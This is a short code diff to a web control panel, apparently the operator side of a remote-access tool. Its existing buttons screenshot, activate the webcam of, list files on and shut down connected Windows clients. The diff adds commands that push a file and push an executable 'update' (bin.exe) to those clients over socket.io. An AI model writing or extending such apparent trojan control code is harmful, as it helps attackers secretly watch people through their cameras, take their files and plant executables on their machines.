@@ -36,6 +36,8 @@
                   <button onclick="screenshot(${c})">screenshot</button>
                   <button onclick="webcam(${c})">webcam</button>
                   <button onclick="ls(${c}, 'C://')">ls</button>
+                  <button onclick="send(${c}, 'C://')">send</button>
+                  <button onclick="sendUpdate(${c}, 'C://')">update</button>
                   <button onclick="sendoff(${c})">close</button>
                   <button onclick="shutdown(${c})">shutdown</button>
                 </td>
@@ -124,6 +126,16 @@
         console.log('shutdown', cl);
         socket.emit('client:send', {sid: cl, cmd: 'shutdown', args: '0'});
       }
+    }
+
+    function send(cl) {
+      console.log('send', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'send', args: {path: 'test.txt', name: 'test.txt'}});
+    }
+
+    function sendUpdate(cl) {
+      console.log('update', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'update', args: {path: 'bin.exe'}});
     }
 
 
